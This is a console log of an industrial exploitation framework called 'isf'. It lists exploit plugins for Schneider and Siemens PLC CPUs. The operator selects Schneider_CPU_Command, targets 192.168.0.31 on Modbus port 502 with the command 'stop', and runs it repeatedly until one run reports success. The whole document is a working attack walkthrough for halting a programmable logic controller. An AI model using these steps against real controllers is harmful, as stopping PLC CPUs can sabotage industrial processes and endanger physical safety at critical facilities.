isf > autorun
[*] Autorun ON

Exploit Autorun List
====================

  0) apply
  1) touch all
  2) prompt confirm
  3) execute


Payload Autorun List
====================

  0) apply
  1) prompt confirm
  2) execute


isf > setg ISFStorage D:\isf\isf\storage
[+] Set ISFStorage =>. D:\isf\isf\storage
isf > show Exploit

Plugin Category: Exploit
========================

  Name                            Version
  ----                            -------
  Schneider_CPU_Command           1.1.0
  Siemens_300_400_CPU_Control     1.1.0

isf > use Schneider_CPU_Command

[!] Entering Plugin Context :: Schneider_CPU_Command
[*] Applying Global Variables

isf Exploit (Schneider_CPU_Command) > apply
[*] Applying Session Parameters
isf Exploit (Schneider_CPU_Command) > echo Running Exploit Touches
[*] Running Exploit Touches
isf Exploit (Schneider_CPU_Command) > touch all
isf Exploit (Schneider_CPU_Command) > enter Exploit

isf Exploit (Schneider_CPU_Command) > prompt confirm

[!] Enter Prompt Mode :: Schneider_CPU_Command

Module: Schneider_CPU_Command
=============================

  Name            Value                                                 
  ----            -----                                                 
  TargetIp                                                              
  TargetPort      502                                                   
  Command         stop                                                  

[!] plugin variables are valid

[*]  TargetIp :: Target IP Address

[+] Set TargetIp => 192.168.0.31

[*]  TargetPort :: Target Port

[+] Set TargetPort => 502

[*]  Command :: The control command of cpu [stop/start]

[+] Set Command => stop

isf Exploit (Schneider_CPU_Command) > execute

[!] Preparing to Execute Schneider_CPU_Command

Module: Schneider_CPU_Command
=============================

  Name            Value                                                 
  ----            -----                                                 
  TargetIp        192.168.0.31                                          
  TargetPort      502                                                   
  Command         stop                                                  

[-] Error running plugin: 
[-] Error: Schneider_CPU_Command Failed
isf Exploit (Schneider_CPU_Command) > execute

[!] Preparing to Execute Schneider_CPU_Command

Module: Schneider_CPU_Command
=============================

  Name            Value                                                 
  ----            -----                                                 
  TargetIp        192.168.0.31                                          
  TargetPort      502                                                   
  Command         stop                                                  

[*] Executing Plugin
[-] Timeout error
[-] Error running plugin: 
[-] Error: Schneider_CPU_Command Failed
isf Exploit (Schneider_CPU_Command) > execute

[!] Preparing to Execute Schneider_CPU_Command

Module: Schneider_CPU_Command
=============================

  Name            Value                                                 
  ----            -----                                                 
  TargetIp        192.168.0.31                                          
  TargetPort      502                                                   
  Command         stop                                                  

[*] Executing Plugin
[+] Schneider_CPU_Command Succeeded

isf Exploit (Schneider_CPU_Command) > execute

[!] Preparing to Execute Schneider_CPU_Command

Module: Schneider_CPU_Command
=============================

  Name            Value                                                 
  ----            -----                                                 
  TargetIp        192.168.0.31                                          
  TargetPort      502                                                   
  Command         stop                                                  

[*] Executing Plugin
[!] Plugin failed
[-] Error: Schneider_CPU_Command Failed
